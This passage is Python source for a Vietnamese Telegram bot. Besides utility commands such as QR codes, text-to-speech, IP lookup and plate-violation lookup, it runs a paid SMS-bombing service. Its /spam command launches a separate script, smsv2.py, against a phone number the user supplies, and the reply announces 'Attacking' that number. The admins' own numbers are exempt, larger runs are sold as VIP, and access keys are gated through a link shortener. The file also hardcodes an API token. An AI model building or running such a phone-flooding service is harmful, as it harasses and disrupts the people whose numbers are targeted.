> ‚îú ND: napvip_{user_id}
> ‚îú S·ªë Ti·ªÅn: 30.000 VNƒê
> ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[‚úì]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

L∆∞u √ù:
    + Khi Bank Nh·ªõ Nh·∫≠p ƒê√∫ng N·ªôi Dung Chuy·ªÉn Ti·ªÅn.
    + Khi Bank Xong Vui L√≤ng Li√™n H·ªá @Ngocdoian ƒê·ªÉ Add Vip.
    + Khi li√™n h·ªá telegram ko ƒëc th√¨ li√™n h·ªá zalo ADMIN.
    + ZALO: https://tinyurl.com/2y79qkkp
"""
        # Escape the caption
        caption = escape_markdown(caption)

        bot.send_photo(call.message.chat.id, qr_code_url, caption=caption, parse_mode='MarkdownV2')
@bot.message_handler(commands=['admin'])
def send_admin_info(message):
    username = message.from_user.username
    admin_info = f'''
    ‚≠ì {escape_markdown(name_bot)} ‚≠ì
    ¬ª Xin ch√†o @{escape_markdown(username)}
    ¬ª Admin: @Ngocdoian
    ¬ª Zalo: {escape_markdown(zalo)}
    ¬ª Telegram: @{escape_markdown(admins)}
    ¬ª L∆∞u √ù: Spam Li√™n
       T·ª•c L·ªánh ƒÇn Ban
       ƒê·ª´ng K√™u M·ªü 
    '''
    video_url = "https://files.catbox.moe/5l74tr.mp4"
    bot.send_video(message.chat.id, video_url, caption=admin_info, parse_mode='MarkdownV2')

@bot.message_handler(commands=['cpu'])
def check_system_info(message):
    if not is_admin(message):
        bot.reply_to(message, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!")
        return

    cpu_percent = psutil.cpu_percent()
    memory_percent = psutil.virtual_memory().percent

    message_text = f"üñ• Th√¥ng Tin Pc üñ•\n\n" \
                   f"üáªüá≥ Admin: NgocDoiAn\n\n" \
                   f"üìä Cpu: {cpu_percent}%\n" \
                   f"üß† Memory: {memory_percent}%"
    bot.reply_to(message, message_text)

@bot.message_handler(commands=['restart'])
def restart(message):
    if not is_admin(message):
        bot.reply_to(message, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!")
        return

    bot.reply_to(message, 'üöÄ Bot s·∫Ω ƒë∆∞·ª£c kh·ªüi ƒë·ªông l·∫°i trong gi√¢y l√°t... üöÄ')
    time.sleep(10)
    python = sys.executable
    os.execl(python, python, *sys.argv)

@bot.message_handler(commands=['stop'])
def stop(message):
    if not is_admin(message):
        bot.reply_to(message, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!")
        return

    bot.reply_to(message, 'üöÄ Bot s·∫Ω d·ª´ng l·∫°i trong gi√¢y l√°t... üöÄ')
    time.sleep(1)
    bot.stop_polling()

is_bot_active = True
import os
import subprocess
import time

cooldown_dict = {}
processes = []

@bot.message_handler(commands=['all'])
def noti(message):
    if not is_admin(message):
        bot.reply_to(message, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!")
        return

    # Chia t√°ch l·ªánh v√† th√¥ng b√°o
    args = message.text.split(' ', 1)  # T√°ch ph·∫ßn sau c·ªßa l·ªánh
    if len(args) < 2 or args[1].strip() == '':
        bot.reply_to(message, "Xin l·ªói, kh√¥ng c√≥ n·ªôi dung th√¥ng b√°o")
        return

    # ƒê·ªçc danh s√°ch ID t·ª´ file
    with open('id', 'r') as file:
        user_ids = {line.strip() for line in file.readlines()}

    # G·ª≠i video v√† th√¥ng b√°o t·ªõi t·ª´ng ng∆∞·ªùi d√πng
    for user_id in user_ids:
        try:
            chat_id = int(user_id)

            # Ki·ªÉm tra n·∫øu chat_id l√† c·ªßa nh√≥m (ID √¢m) th√¨ b·ªè qua
            if chat_id < 0:
                print(f"B·ªè qua nh√≥m v·ªõi chat_id: {chat_id}")
                continue  # B·ªè qua nh√≥m, kh√¥ng g·ª≠i th√¥ng b√°o

            video_url = "https://files.catbox.moe/5l74tr.mp4"
            notification_message = f"{escape_markdown(args[1].strip())}"
            bot.send_video(chat_id, video_url, caption=notification_message, parse_mode='MarkdownV2')
            lan[chat_id] = {"count": 0}

        except Exception as e:
            print(f"ƒêang g·ª≠i th√¥ng b√°o t·ªõi {user_id}: L·ªói - {e}")
            # Sau khi g·ª≠i xong th√¥ng b√°o cho t·∫•t c·∫£ ng∆∞·ªùi d√πng, tr·∫£ l·ªùi th√¥ng b√°o th√†nh c√¥ng
    bot.reply_to(message, "ƒê√£ r·∫£i th√¥ng b√°o th√†nh c√¥ng ƒë·∫øn t·∫•t c·∫£ ng∆∞·ªùi d√πng!")

# X·ª≠ l√Ω l·ªánh /getid

def get_facebook_id(facebook_url):
    try:
        # API URL ƒë·ªÉ l·∫•y Facebook ID t·ª´ li√™n k·∫øt
        api_url = f"https://keyherlyswar.x10.mx/Apidocs/findid.php?url={facebook_url}"
        response = requests.get(api_url)
        
        # Ki·ªÉm tra ph·∫£n h·ªìi t·ª´ API
        response.raise_for_status()  # Ki·ªÉm tra n·∫øu c√≥ l·ªói HTTP
        
        # Parse d·ªØ li·ªáu JSON tr·∫£ v·ªÅ t·ª´ API
        data = response.json()
        
        # Ki·ªÉm tra n·∫øu c√≥ th√¥ng tin ID trong d·ªØ li·ªáu tr·∫£ v·ªÅ
        if 'id' in data:
            return data['id']
        else:
            return None
    except requests.exceptions.RequestException as e:
        # N·∫øu c√≥ l·ªói trong qu√° tr√¨nh g·ªçi API
        print(f"Error: {e}")
        return None

@bot.message_handler(commands=['getid'])
def send_facebook_id(message):
    waiting_message = bot.reply_to(message, 'üîç')

    try:
        # T√°ch link t·ª´ tin nh·∫Øn c·ªßa ng∆∞·ªùi d√πng
        link = message.text.split()[1]
        
        # L·∫•y Facebook ID t·ª´ li√™n k·∫øt
        facebook_id = get_facebook_id(link)
        
        if facebook_id:
            # G·ª≠i ID v·ªõi th√¥ng b√°o d·∫°ng y√™u c·∫ßu
            bot.reply_to(message, f"ƒê√¢y l√† ID c·ªßa li√™n k·∫øt Facebook: {facebook_id}")
        else:
            bot.reply_to(message, "Kh√¥ng th·ªÉ l·∫•y ID t·ª´ li√™n k·∫øt Facebook n√†y. Vui l√≤ng ki·ªÉm tra l·∫°i.")
        
        # X√≥a tin nh·∫Øn ch·ªù sau khi ho√†n th√†nh
        bot.delete_message(message.chat.id, waiting_message.message_id)

    except IndexError:
        bot.reply_to(message, "Vui l√≤ng cung c·∫•p link Facebook h·ª£p l·ªá sau l·ªánh /getid.")
        bot.delete_message(message.chat.id, waiting_message.message_id)


#s·ª≠ l√≠ l·ªánh vi_pham
def check_car_info(bsx):
    url = f'https://vietcheckcar.com/api/api.php?api_key=sfund&bsx={bsx}&bypass_cache=0&loaixe=1&vip=0'
    response = requests.get(url)
    return response.json()

@bot.message_handler(commands=['vi_pham'])
def handle_check(message):
    try:
        # L·∫•y bi·ªÉn s·ªë t·ª´ tin nh·∫Øn
        bsx = message.text.split()[1]
        # G·ªçi API v√† l·∫•y k·∫øt qu·∫£
        car_info = check_car_info(bsx)

        # Ki·ªÉm tra n·∫øu c√≥ vi ph·∫°m
        if car_info.get('totalViolations', 0) > 0:
            # L·∫•y th√¥ng tin vi ph·∫°m ƒë·∫ßu ti√™n
            violation = car_info['violations'][0]

            # Tr√≠ch xu·∫•t th√¥ng tin t·ª´ JSON
            bien_so = violation.get('bien_kiem_sat', 'N/A')
            trang_thai = violation.get('trang_thai', 'N/A')
            mau_bien = violation.get('mau_bien', 'N/A')
            loai_phuong_tien = violation.get('loai_phuong_tien', 'N/A')
            thoi_gian_vi_pham = violation.get('thoi_gian_vi_pham', 'N/A')
            dia_diem_vi_pham = violation.get('dia_diem_vi_pham', 'N/A')
            hanh_vi_vi_pham = violation.get('hanh_vi_vi_pham', 'N/A')
            don_vi_phat_hien_vi_pham = violation.get('don_vi_phat_hien_vi_pham', 'N/A')
            noi_giai_quyet_vu_viec = violation.get('noi_giai_quyet_vu_viec', 'N/A').replace('\\n', '\n')  # X·ª≠ l√Ω \n trong JSON
            so_dien_thoai = violation.get('so_dien_thoai', 'N/A')
            muc_phat = violation.get('muc_phat', 'N/A')

            # ƒê·ªãnh d·∫°ng tin nh·∫Øn
            message_text = f'''
<blockquote expandable>‚îè‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îì
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅùôèùôùùô§ÃÇùô£ùôú ùô©ùôûùô£ ùô´ùôû ùô•ùôùùôñÃ£ùô¢‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚îó‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îõ
¬ª Bi·ªÉn s·ªë: {bien_so}

¬ª Tr·∫°ng th√°i: {trang_thai}

¬ª M√†u bi·ªÉn: {mau_bien}

¬ª Lo·∫°i ph∆∞∆°ng ti·ªán: {loai_phuong_tien}

¬ª Th·ªùi gian vi ph·∫°m: {thoi_gian_vi_pham}

¬ª ƒê·ªãa ƒëi·ªÉm vi ph·∫°m: {dia_diem_vi_pham}

¬ª H√†nh vi vi ph·∫°m: {hanh_vi_vi_pham}

¬ª ƒê∆°n v·ªã ph√°t hi·ªán vi ph·∫°m: {don_vi_phat_hien_vi_pham}

¬ª N∆°i gi·∫£i quy·∫øt v·ª• vi·ªác: {noi_giai_quyet_vu_viec}</blockquote>'''

            # G·ª≠i tin nh·∫Øn v·ªõi th√¥ng tin
            bot.send_message(message.chat.id, {message_text}, parse_mode="HTML")

        else:
            bot.send_message(message.chat.id, f"<blockquote>Bi·ªÉn s·ªë xe {bsx} kh√¥ng c√≥ l·ªói vi ph·∫°m.</blockquote>", parse_mode="HTML")

    except IndexError:
        bot.send_message(message.chat.id, "Vui l√≤ng nh·∫≠p bi·ªÉn s·ªë xe. V√≠ d·ª•: /vi_pham 24A14307")
    except Exception as e:
        bot.send_message(message.chat.id, f"L·ªói: {str(e)}")


@bot.message_handler(commands=['voice'])
def text_to_voice(message):
    # L·∫•y n·ªôi dung vƒÉn b·∫£n sau l·ªánh /voice
    text = message.text[len('/voice '):].strip()

    # N·∫øu kh√¥ng c√≥ vƒÉn b·∫£n, tr·∫£ l·ªùi h∆∞·ªõng d·∫´n s·ª≠ d·ª•ng
    if not text:
        bot.reply_to(message, "ü§ñ Tqhuy-BOT\nUsage: /voice <Text>")
        return

    # T·∫°o t·ªáp t·∫°m th·ªùi ƒë·ªÉ l∆∞u file .mp3 v·ªõi t√™n "elven"
    temp_file_path = tempfile.mktemp(suffix='elven.mp3')

    try:
        # Chuy·ªÉn vƒÉn b·∫£n th√†nh gi·ªçng n√≥i b·∫±ng gTTS
        tts = gTTS(text, lang='vi')
        tts.save(temp_file_path)

        # M·ªü v√† g·ª≠i file √¢m thanh .mp3 v·ªõi t√™n "elven"
        with open(temp_file_path, 'rb') as audio_file:
            bot.send_voice(chat_id=message.chat.id, voice=audio_file)

    except Exception as e:
        bot.reply_to(message, "ü§ñ VuThiHoa-BOT\nError Bot")
    
    finally:
        # X√≥a t·ªáp √¢m thanh t·∫°m th·ªùi sau khi g·ª≠i
        if os.path.exists(temp_file_path):
            os.remove(temp_file_path)

@bot.message_handler(commands=['qr'])
def generate_qr(message):
    # T√°ch t·ª´ kh√≥a nh·∫≠p v√†o l·ªánh
    input_text = message.text.split(maxsplit=1)
    
    if len(input_text) > 1:
        input_text = input_text[1]  # L·∫•y ph·∫ßn t·ª´ kh√≥a sau /qr
        # T·∫°o QR code
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(input_text)
        qr.make(fit=True)
        
        img = qr.make_image(fill='black', back_color='white')
        bio = BytesIO()
        bio.name = 'qr.png'
        img.save(bio, 'PNG')
        bio.seek(0)

        # G·ª≠i ·∫£nh QR t·ªõi ng∆∞·ªùi d√πng
        bot.send_photo(message.chat.id, photo=bio, caption=f"<blockquote>QR c·ªßa ch·ªØ: {input_text}</blockquote>",parse_mode="HTML")
    else:
        bot.reply_to(message, "ü§ñ VuThiHoa_bot\nü§ñ Usage: /qr <Ch·ªØ C·∫ßn T·∫°o QR>")


# S·ª≠ l√≠ GetKey
from datetime import datetime

def TimeStamp():
    now = datetime.now().date()  # ƒê√∫ng c√°ch l·∫•y ng√†y hi·ªán t·∫°i
    return now

def get_time_vietnam():
    return datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")

def init_db():
    connection = sqlite3.connect('users.db', check_same_thread=False)
    cursor = connection.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            key TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    connection.commit()
    connection.close()

init_db()


# Thi·∫øt l·∫≠p c∆° s·ªü d·ªØ li·ªáu
def setup_database():
    connection = sqlite3.connect('users.db', check_same_thread=False)
    cursor = connection.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            key TEXT,
            has_used_key INTEGER DEFAULT 0
        )
    ''')
    connection.commit()
    connection.close()

setup_database()


# L·ªánh l·∫•y key
@bot.message_handler(commands=['getkey_spam'])
def startkey(message):
    if not check_access(message):  # Ki·ªÉm tra quy·ªÅn
        return

    bot.reply_to(message, text='üîÑ VUI L√íNG ƒê·ª¢I TRONG GI√ÇY L√ÅT...')
    today = datetime.now().date()  # L·∫•y ng√†y hi·ªán t·∫°i
    key = "NgocDoiAn_" + str(int(message.from_user.id) * int(today.day) - 12666)
    key = "https://www.thengoc.x10.mx/?key=" + key
    api_token = '678872637ebb6e7ecd0fcbb6'

    try:
        response = requests.get(f'https://link4m.co/api-shorten/v2?api={api_token}&url={key}')
        url = response.json()
        
        if 'shortenedUrl' in url:
            url_key = url['shortenedUrl']
        else:
            bot.reply_to(message, '‚ùå Kh√¥ng t√¨m th·∫•y shortenedUrl trong ph·∫£n h·ªìi.')
            return

    except requests.RequestException as e:
        bot.reply_to(message, '‚ùå ƒê√£ x·∫£y ra l·ªói khi k·∫øt n·ªëi ƒë·∫øn API.')
        print(f"Request error: {e}")
        return

    text = f'''
- LINK L·∫§Y KEY C·ª¶A @{message.from_user.username} NG√ÄY {datetime.now().strftime('%d-%m-%Y')} L√Ä: {url_key} 
- KHI L·∫§Y KEY XONG, D√ôNG L·ªÜNH /key_spam <key> ƒê·ªÇ K√çCH HO·∫†T QUY·ªÄN S·ª¨ D·ª§NG /spam.
    '''
    bot.reply_to(message, text)

# L·ªánh ki·ªÉm tra key
@bot.message_handler(commands=['key_spam'])
def key(message):
    if not check_access(message):  # Ki·ªÉm tra quy·ªÅn
        return
    if len(message.text.split()) == 1:
        bot.reply_to(message, '‚ùå VUI L√íNG NH·∫¨P KEY. D√ôNG /key_spam <key>')
        return

    user_id = message.from_user.id
    key = message.text.split()[1]
    today = datetime.now().date()  # L·∫•y ng√†y hi·ªán t·∫°i
    expected_key = "NgocDoiAn_" + str(int(message.from_user.id) * int(today.day) - 12666)

    if key == expected_key:
        # L∆∞u tr·∫°ng th√°i ƒë√£ nh·∫≠p key v√†o file
        user_dir = f'./user/{today.day}/'
        os.makedirs(user_dir, exist_ok=True)  # T·∫°o th∆∞ m·ª•c n·∫øu ch∆∞a t·ªìn t·∫°i
        with open(f'{user_dir}/{user_id}.txt', 'w') as f:
            f.write("")  # File r·ªóng ƒë·ªÉ ƒë√°nh d·∫•u ƒë√£ k√≠ch ho·∫°t quy·ªÅn

        bot.reply_to(message, '‚òëÔ∏è KEY H·ª¢P L·ªÜ ‚òëÔ∏è. B·∫†N ƒê√É ƒê∆Ø·ª¢C PH√âP S·ª¨ D·ª§NG L·ªÜNH /spam.')
    else:
        bot.reply_to(message, '‚ùå KEY KH√îNG H·ª¢P L·ªÜ. VUI L√íNG KI·ªÇM TRA L·∫†I.')

from collections import defaultdict

conversation_history = defaultdict(list)  # M·∫∑c ƒë·ªãnh m·ªói user_id s·∫Ω c√≥ m·ªôt list r·ªóng


@bot.message_handler(commands=['spam'])
def spam(message):
    if not check_access(message):  # Ki·ªÉm tra quy·ªÅn
        return
    user_id = message.from_user.id
    username = message.from_user.username
    current_time = time.time()

    # Cooldown logic: ki·ªÉm tra th·ªùi gian ch·ªù
    if username in cooldown_dict and current_time - cooldown_dict[username].get('spam', 0) < 65:
        remaining_time = int(65 - (current_time - cooldown_dict[username].get('spam', 0)))
        bot.reply_to(message, f"@{username}, vui l√≤ng ƒë·ª£i {remaining_time} gi√¢y tr∆∞·ªõc khi s·ª≠ d·ª•ng l·∫°i l·ªánh /spam.")
        return

    today = date.today()
    user_directory = f"./user/{today.day}/"
    user_file_path = os.path.join(user_directory, f"{user_id}.txt")

    # Ki·ªÉm tra xem th∆∞ m·ª•c c√≥ t·ªìn t·∫°i kh√¥ng
    if not os.path.exists(user_directory):
        os.makedirs(user_directory)  # T·∫°o th∆∞ m·ª•c n·∫øu ch∆∞a t·ªìn t·∫°i

    if not os.path.exists(user_file_path):
        bot.reply_to(message, '*Vui l√≤ng GET KEY c·ªßa ng√†y h√¥m nay* -D√πng /getkey_spam ƒë·ªÉ l·∫•y key v√† d√πng /key_spam ƒë·ªÉ nh·∫≠p key h√¥m nay.')
        return

    # Ki·ªÉm tra s·ªë ƒëi·ªán tho·∫°i v√† l·∫∑p
    if len(message.text.split()) < 3:
        bot.reply_to(message, 'VUI L√íNG NH·∫¨P S·ªê ƒêI·ªÜN THO·∫†I V√Ä S·ªê L·∫¶N SPAM!')
        return

    phone_number = message.text.split()[1]
    lap = message.text.split()[2]

    if not lap.isnumeric() or not (1 <= int(lap) <= 10):
        bot.reply_to(message, "Vui l√≤ng spam trong kho·∫£ng 1-10. N·∫øu nhi·ªÅu h∆°n mua vip ƒë·ªÉ s√†i üòº")
        return

    if phone_number in ["0985237602", "0326274360","0339946702"]:
        bot.reply_to(message, "Spam s√¥ÃÅ ADMIN b·∫°n ·∫° ƒë·ª´ng ƒë·ª•ng k·∫ªo ƒÉn ban")
        return

    file_path = os.path.join(os.getcwd(), "smsv2.py")

    # Use a single file path and process
    process = subprocess.Popen(["python3", file_path, phone_number, lap])
    processes.append(process)

    thoigian = dt.now().strftime('%d-%m-%Y %H:%M:%S')

    video_url = "https://files.catbox.moe/2vx7k6.mp4"  # Replace this with the actual video URL
    message_text = (f'''
> ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚≠ì {name_bot} ‚≠ì‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
> ‚îÇ¬ª User: @{username} ƒë√£ g·ª≠i spam                     
> ‚îÇ¬ª Spam: Th√†nh C√¥ng [‚úì]
> ‚îÇ¬ª User: Free
> ‚îÇ¬ª Attacking: {phone_number}
> ‚îÇ¬ª Admin: Ngocdoian 
> ‚îÇ¬ª S·ªë l·∫ßn {lap}
> ‚îÇ¬ª Telegram Admin: Ngocdoian
> ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[‚úì]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
   ''')
    bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')

    # L∆∞u th·ªùi gian s·ª≠ d·ª•ng l·ªánh cu·ªëi c√πng
    if username not in cooldown_dict:
        cooldown_dict[username] = {}
    cooldown_dict[username]['spam'] = current_time

@bot.message_handler(commands=['info'])
def handle_check(message):
    user = message.reply_to_message.from_user if message.reply_to_message else message.from_user
    
    # Hi·ªÉn th·ªã bi·ªÉu t∆∞·ª£ng ƒë·ª£i
    waiting = bot.reply_to(message, "üîé")
    
    # L·∫•y th√¥ng tin ng∆∞·ªùi d√πng
    user_photos = bot.get_user_profile_photos(user.id)
    chat_info = bot.get_chat(user.id)
    chat_member_status = bot.get_chat_member(message.chat.id, user.id).status
    
    bio = chat_info.bio or "Kh√¥ng c√≥ bio"
    user_first_name = user.first_name
    user_last_name = user.last_name or ""
    user_username = f"@{user.username}" if user.username else "Kh√¥ng c√≥ username"
    user_language = user.language_code or 'Kh√¥ng x√°c ƒë·ªãnh'
    
    # ƒê·ªãnh nghƒ©a tr·∫°ng th√°i ng∆∞·ªùi d√πng
    status_dict = {
        "creator": "Admin ch√≠nh",
        "administrator": "Admin",
        "member": "Th√†nh vi√™n",
        "restricted": "B·ªã h·∫°n ch·∫ø",
        "left": "R·ªùi nh√≥m",
        "kicked": "B·ªã ƒëu·ªïi kh·ªèi nh√≥m"
    }
    status = status_dict.get(chat_member_status, "Kh√¥ng x√°c ƒë·ªãnh")
    
    # So·∫°n tin nh·∫Øn g·ª≠i ƒëi
    caption = (
        "<pre>     üöÄ TH√îNG TIN üöÄ\n"
        "‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚≠ìINFO‚≠ì‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n"
        f"‚îÇ¬ª üÜî: <b>{user.id}</b>\n"
        f"‚îÇ¬ª üë§T√™n: {user_first_name} {user_last_name}\n"
        f"‚îÇ¬ª üëâUsername: {user_username}\n"
        f"‚îÇ¬ª üî∞Ng√¥n ng·ªØ: {user_language}\n"
        f"‚îÇ¬ª üè¥Tr·∫°ng th√°i: {status}\n"
        f"‚îÇ¬ª ‚úçÔ∏èBio: {bio}\n"
        f"‚îÇ¬ª ü§≥Avatar: {'ƒê√£ c√≥ avatar' if user_photos.total_count > 0 else 'Kh√¥ng c√≥ avatar'}\n"
        "‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[‚úì]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</pre>"
    )
    
    # G·ª≠i ·∫£nh ho·∫∑c tin nh·∫Øn vƒÉn b·∫£n
    if user_photos.total_count > 0:
        bot.send_photo(message.chat.id, user_photos.photos[0][-1].file_id, caption=caption, parse_mode='HTML', reply_to_message_id=message.message_id)
    else:
        bot.reply_to(message, caption, parse_mode='HTML')
    
    # X√≥a tin nh·∫Øn ch·ªù sau khi ho√†n t·∫•t
    def xoatn(message, delay):
        try:
            bot.delete_message(message.chat.id, waiting.message_id)
        except Exception as e:
            print(f"L·ªói khi x√≥a tin nh·∫Øn: {e}")
    
    threading.Thread(target=xoatn, args=(message, 0)).start()

@bot.message_handler(commands=['check'])
def check_hot_web(message):
    # Ki·ªÉm tra xem l·ªánh c√≥ ƒë·ªß tham s·ªë kh√¥ng (URL c·ªßa trang web c·∫ßn ki·ªÉm tra)
    if len(message.text.split()) < 2:
        bot.reply_to(message, '<blockquote>Vui l√≤ng cung c·∫•p URL c·ªßa trang web c·∫ßn ki·ªÉm tra (VD: /check https://example.com).</blockquote>',parse_mode='HTML')
        return
    
    # L·∫•y URL t·ª´ l·ªánh
    url = message.text.split()[1]

    try:
        # G·ª≠i y√™u c·∫ßu HTTP GET ƒë·∫øn URL
        response = requests.get(url, timeout=10)
        
        # Ki·ªÉm tra tr·∫°ng th√°i c·ªßa trang web
        if response.status_code == 200:
            bot.reply_to(message, f"<blockquote>üîó Trang web {url} ƒëang ho·∫°t ƒë·ªông b√¨nh th∆∞·ªùng (Status: 200 OK).</blockquote>", parse_mode='HTML')
        else:
            bot.reply_to(message, f"<blockquote>‚ö†Ô∏è Trang web {url} c√≥ v·∫•n ƒë·ªÅ (Status: {response.status_code}).</blockquote>", parse_mode='HTML')
    except requests.exceptions.RequestException as e:
        # X·ª≠ l√Ω l·ªói n·∫øu kh√¥ng th·ªÉ k·∫øt n·ªëi t·ªõi trang web
        bot.reply_to(message, f"<blockquote>‚ùå Kh√¥ng th·ªÉ k·∫øt n·ªëi t·ªõi trang web {url}. L·ªói: {e}</blockquote>", parse_mode='HTML')

@bot.message_handler(commands=['checkip'])
def check_ip(message):
    # L·∫•y c√°c tham s·ªë t·ª´ l·ªánh
    params = message.text.split()
    
    if len(params) < 2:
        bot.reply_to(message, 'Vui l√≤ng cung c·∫•p ƒë·ªãa ch·ªâ IP c·∫ßn ki·ªÉm tra (VD: /checkip 8.8.8.8).')
        return
    
    ip_address = params[1]

    try:
        # G·ª≠i y√™u c·∫ßu t·ªõi d·ªãch v·ª• API ƒë·ªÉ l·∫•y th√¥ng tin chi ti·∫øt v·ªÅ ƒë·ªãa ch·ªâ IP
        response = requests.get(f'https://ipinfo.io/{ip_address}/json', timeout=10)
        response.raise_for_status()  # Ki·ªÉm tra l·ªói HTTP
        
        # L·∫•y d·ªØ li·ªáu t·ª´ ph·∫£n h·ªìi
        ip_data = response.json()

        # Tr√≠ch xu·∫•t th√¥ng tin chi ti·∫øt
        city = ip_data.get('city', 'Kh√¥ng x√°c ƒë·ªãnh')
        region = ip_data.get('region', 'Kh√¥ng x√°c ƒë·ªãnh')
        country = ip_data.get('country', 'Kh√¥ng x√°c ƒë·ªãnh')
        org = ip_data.get('org', 'Kh√¥ng x√°c ƒë·ªãnh')
        loc = ip_data.get('loc', 'Kh√¥ng x√°c ƒë·ªãnh')
        
        # T·∫°o th√¥ng tin ƒë·ªÉ g·ª≠i cho ng∆∞·ªùi d√πng
        ip_info = (f"<blockquote>üåê ƒê·ªãa ch·ªâ IP: {ip_address}\n"
                   f"üìç Th√†nh ph·ªë: {city}\n"
                   f"üèõ Khu v·ª±c: {region}\n"
                   f"üåé Qu·ªëc gia: {country}\n"
                   f"üè¢ T·ªï ch·ª©c: {org}\n"
                   f"üìç V·ªã tr√≠ (Lat, Lng): {loc}</blockquote>")
        
        # G·ª≠i th√¥ng tin ƒë·ªãa ch·ªâ IP t·ªõi ng∆∞·ªùi d√πng
        bot.reply_to(message, ip_info, parse_mode='HTML')
    except requests.exceptions.RequestException as e:
        # X·ª≠ l√Ω l·ªói n·∫øu kh√¥ng th·ªÉ k·∫øt n·ªëi ƒë·∫øn d·ªãch v·ª• API
        bot.reply_to(message, f"<blockquote>‚ùå Kh√¥ng th·ªÉ k·∫øt n·ªëi t·ªõi d·ªãch v·ª• ki·ªÉm tra IP. L·ªói: {e}</pre>", parse_mode='blockquote')
    except Exception as e:
        # X·ª≠ l√Ω c√°c l·ªói kh√°c
        bot.reply_to(message, f"<blockquote>‚ùå ƒê√£ x·∫£y ra l·ªói khi ki·ªÉm tra IP. L·ªói: {e}</pre>", parse_mode='blockquote')

@bot.message_handler(commands=['html'])
def handle_code_command(message):
    # T√°ch l·ªánh v√† URL t·ª´ tin nh·∫Øn
    command_args = message.text.split(maxsplit=1)

    # Ki·ªÉm tra xem URL c√≥ ƒë∆∞·ª£c cung c·∫•p kh√¥ng
    if len(command_args) < 2:
        bot.reply_to(message, "Vui l√≤ng cung c·∫•p url sau l·ªánh /html. V√≠ d·ª•: /html https://example.com")
        return

    url = command_args[1]
    
    # Ki·ªÉm tra xem URL c√≥ h·ª£p l·ªá kh√¥ng
    parsed_url = urlparse(url)
    if not parsed_url.scheme or not parsed_url.netloc:
        bot.reply_to(message, "Vui l√≤ng cung c·∫•p m·ªôt URL h·ª£p l·ªá.")
        return

    domain = parsed_url.netloc
    file_name = f"NgocDoiAn_get.html"
    
    try:
        # L·∫•y n·ªôi dung HTML t·ª´ URL
        response = requests.get(url)
        response.raise_for_status()  # X·∫£y ra l·ªói n·∫øu c√≥ l·ªói HTTP

        # L∆∞u n·ªôi dung HTML v√†o file
        with open(file_name, 'w', encoding='utf-8') as file:
            file.write(response.text)

        # ƒê·ªãnh d·∫°ng HTML v√† g·ª≠i file v·ªÅ ng∆∞·ªùi d√πng
        with open(file_name, 'rb') as file:
            caption = f"<blockquote>HTML c·ªßa trang web:\n{url}</blockquote>"
            bot.send_document(message.chat.id, file, caption=caption, parse_mode='HTML')

    except requests.RequestException as e:
        bot.reply_to(message, f"ƒê√£ x·∫£y ra l·ªói khi t·∫£i trang web: {e}")

    except Exception as e:
        bot.reply_to(message, f"ƒê√£ x·∫£y ra l·ªói khi x·ª≠ l√Ω file: {e}")

    finally:
        # ƒê·∫£m b·∫£o x√≥a file sau khi g·ª≠i
        if os.path.exists(file_name):
            try:
                os.remove(file_name)
            except Exception as e:
                bot.reply_to(message, f"ƒê√£ x·∫£y ra l·ªói khi x√≥a file: {e}")


#s·ª≠ l√≠ l·ªánh m·ªü m√µm v√† kh√≥a m√µ
@bot.message_handler(commands=['im'])
def warn_user(message):
    if not is_admin(message):
        bot.reply_to(message, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!")
        return
    
    # Ki·ªÉm tra xem tin nh·∫Øn c√≥ ch·ª©a th√¥ng tin c·∫ßn thi·∫øt kh√¥ng
    if not message.reply_to_message:
        bot.reply_to(message, '<blockquote>∆† !!!</blockquote>', parse_mode='HTML')
        return

    user_id = message.reply_to_message.from_user.id
    
